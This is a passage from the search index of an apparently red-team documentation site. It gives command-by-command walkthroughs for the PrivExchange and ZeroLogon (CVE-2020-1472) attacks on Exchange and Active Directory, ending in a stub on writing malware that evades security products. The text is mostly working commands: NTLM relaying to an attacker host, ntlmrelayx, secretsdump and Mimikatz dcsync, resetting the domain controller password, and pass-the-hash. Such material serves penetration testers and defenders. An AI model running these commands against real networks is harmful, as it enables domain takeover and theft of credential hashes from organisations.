Guide to PrintNightmare in 2024 - itm4n - Jan 28, 2024</li> </ul>"},{"location":"example/CVE/PrivExchange/","title":"PrivExchange","text":"<p>Exchange your privileges for Domain Admin privs by abusing Exchange.    You need a shell on a user account with a mailbox.</p> <ol> <li> <p>Exchange server hostname or IP address</p> <pre><code>pth-net rpc group members \"Exchange Servers\" -I dc01.domain.local -U domain/username\n</code></pre> </li> <li> <p>Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).</p> <pre><code>ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username\n</code></pre> </li> <li> <p>Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server's to send back its NTLMv2 hash to a controlled machine.</p> <pre><code># https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py\npython privexchange.py -ah xxxxxxx -u xxxx -d xxxxx\npython privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange\n\n# https://github.com/G0ldenGunSec/PowerPriv \npowerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016\n</code></pre> </li> <li> <p>Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user's NTLM hash</p> <pre><code>python secretsdump.py xxxxxxxxxx -just-dc\npython secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm\n</code></pre> </li> <li> <p>Clean your mess and restore a previous state of the user's ACL</p> <pre><code>python aclpwn.py --restore ../aclpwn-20190319-125741.restore\n</code></pre> </li> </ol> <p>Alternatively you can use the Metasploit module </p> <p><code>use auxiliary/scanner/http/exchange_web_server_pushsubscription</code></p> <p>Alternatively you can use an all-in-one tool : Exchange2domain.</p> <pre><code>git clone github.com/Ridter/Exchange2domain \npython Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip\npython Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip\n</code></pre>"},{"location":"example/CVE/PrivExchange/#references","title":"References","text":"<ul> <li>Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema</li> <li>Exploiting PrivExchange - April 11, 2019 - @chryzsh</li> <li>[PrivExchange] From user to domain admin in less than 60sec ! - davy</li> <li>Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave</li> </ul>"},{"location":"example/CVE/ZeroLogon/","title":"ZeroLogon","text":"<p>CVE-2020-1472</p> <p>White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055</p> <p>Exploit steps from the white paper</p> <ol> <li>Spoofing the client credential</li> <li>Disabling signing and sealing</li> <li>Spoofing a call</li> <li>Changing a computer's AD password to null</li> <li>From password change to domain admin</li> <li> <p> reset the computer's AD password in a proper way to avoid any Deny of Service</p> </li> <li> <p><code>cve-2020-1472-exploit.py</code> - Python script from dirkjanm <pre><code>  # Check (https://github.com/SecuraBV/CVE-2020-1472)\n  proxychains python3 zerologon_tester.py DC01 172.16.1.5\n\n$ git clone https://github.com/dirkjanm/CVE-2020-1472.git\n\n# Activate a virtual env to install impacket\n$ python3 -m venv venv\n$ source venv/bin/activate\n$ pip3 install .\n\n# Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)\nproxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5\n\n# Find the old NT hash of the DC\nproxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'\n\n# Restore password from secretsdump \n# secretsdump will automatically dump the plaintext machine password (hex encoded) \n# when dumping the local registry secrets on the newest version\npython restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3\ndeactivate\n</code></pre></p> </li> <li> <p><code>nccfsas</code> - .NET binary for Cobalt Strike's execute-assembly   <pre><code>git clone https://github.com/nccgroup/nccfsas\n# Check\nexecute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local\n\n# Resetting the machine account password\nexecute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset\n\n# Testing from a non Domain-joined machine\nexecute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch\n\n# Now reset the password back\n</code></pre></p> </li> <li> <p><code>Mimikatz</code> - 2.2.0 20200917 Post-Zerologon   <pre><code>privilege::debug\n# Check for the CVE\nlsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$\n\n# Exploit the CVE and set the computer account's password to \"\"\nlsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit\n\n# Execute dcsync to extract some hashes\nlsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:\"\" /authntlm\nlsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:\"\" /authntlm\n\n# Pass The Hash with the extracted Domain Admin hash\nsekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN\n\n# Use IP address instead of FQDN to force NTLM with Windows APIs \n# Reset password to Waza1234/Waza1234/Waza1234/\n# https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584\nlsadump::postzerologon /target:10.10.10.10 /account:DC01$\n</code></pre></p> </li> <li> <p><code>netexec</code> - only check   <pre><code>netexec smb 10.10.10.10 -u username -p password -d domain -M zerologon\n</code></pre></p> </li> </ol> <p>A 2nd approach to exploit zerologon is done by relaying authentication.</p> <p>This technique, found by dirkjanm, requires more prerequisites but has the advantage of having no impact on service continuity. The following prerequisites are needed: * A domain account * One DC running the <code>PrintSpooler</code> service * Another DC vulnerable to zerologon</p> <ul> <li><code>ntlmrelayx</code> - from Impacket and any tool such as <code>printerbug.py</code> <pre><code># Check if one DC is running the PrintSpooler service\nrpcdump.py 10.10.10.10 | grep -A 6 \"spoolsv\"\n\n# Setup ntlmrelay in one shell\nntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support\n\n#Trigger printerbug in 2nd shell\npython3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12\n</code></pre></li> </ul>"},{"location":"example/CVE/ZeroLogon/#references","title":"References","text":"<ul> <li>Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020</li> </ul>"},{"location":"maldev/learnings/","title":"Learnings","text":"<p>This is a test</p>"},{"location":"maldev/test/","title":"Introduction","text":"<ul> <li>Malware is a malicious software. These softwares are helping us to do our red team assessments in our clients. In order to bypass security product we should be sthealthy as much as possible. </li> <li>Which programming language should we use? High level or Low level. We should be able to more close to Operating system and be able to reach memory. These possible with Low languages like C. So better to stay in these low level languages. </li> </ul>"},{"location":"maldev/test/#tools-that-we-need","title":"Tools that we need","text":"<ul> <li>Visual Studio</li> <li>x64dbg</li> <li>PE-Bear</li> <li>Process Hacker 2</li> <li>Msfvenom</li> </ul>"}]}